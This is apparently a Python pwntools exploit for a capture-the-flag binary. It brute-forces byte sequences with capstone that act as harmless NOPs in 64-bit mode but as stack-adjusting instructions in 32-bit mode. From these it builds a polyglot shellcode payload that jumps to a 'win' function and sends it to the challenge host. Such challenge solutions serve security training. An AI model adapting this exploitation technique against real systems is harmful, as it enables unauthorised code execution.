#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from capstone import *

exe = context.binary = ELF('./challenge')

host = args.HOST or 'localhost'
port = int(args.PORT or 31337)

win_function = exe.sym['win']
info('    win function: %s', hex(win_function))

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)



x86cap = Cs(CS_ARCH_X86, CS_MODE_32)
x64cap = Cs(CS_ARCH_X86, CS_MODE_64)

NOP          = b'\x90'
INC_ESP      = None

# Find a payload of size 2 that increments the stack position
for i1 in [0x90, 0x66, 0x0f, 0x1f]:     # NOP starts with these address
    for i2 in range(256):
        CODE = bytes([i1, i2])

        x64_instrs = list(x64cap.disasm(CODE, 0))

        # In 64 mode, there should be only one instruction and it needs to be a NOP
        if len(x64_instrs) != 1 or x64_instrs[0].mnemonic != 'nop':
            continue

        x86_instrs = list(x86cap.disasm(CODE, 0))

        # In 32 mode, there should be two instructions (NOP and INC ESP) 
        if len(x86_instrs) != 2:
            continue

        if x86_instrs[1].mnemonic == 'inc' \
                and x86_instrs[1].op_str == 'esp':
            INC_ESP = CODE
            break   # GOTO end

    if INC_ESP:
        break       # GOTO end

info('NOP; INC ESP: %s', INC_ESP)

NOP_WIN      = None
# Find a NOP that can receive win_function address without messing with the stack
for i1 in [0x90, 0x66, 0x0f, 0x1f]:
    for i2 in range(256):
        CODE = bytes([i1, i2]) + p32(win_function)
        x64_instrs = list(x64cap.disasm(CODE, 0))
        if len(x64_instrs) != 1 or x64_instrs[0].mnemonic != 'nop':
            continue

        x86_instrs = list(x86cap.disasm(CODE, 0))

        # If the number of instructions is less then 4, 
        # probably it didn't inserted the win properly
        if len(x86_instrs) < 4:
            continue

        for instr in x86_instrs: 
            # Instructions to be avoided
            if instr.mnemonic in ['push', 'pop', 'bound']:     
                break
        else:
            NOP_WIN = CODE
            break   # GOTO end

    if NOP_WIN:
        break       # GOTO end


info('  NOP; <WIN>: %s', NOP_WIN)

stack_begin = 0xff99c6ec        # Position where the payload starts the execution
stack_win_f = 0xff99c70e        # win_function in stack (at the beginning of the payload)
offset = stack_win_f - stack_begin

payload  = b''
payload += NOP_WIN
payload += INC_ESP * offset

io = start()
io.sendlineafter(b'instructions:\n', payload)
io.interactive()
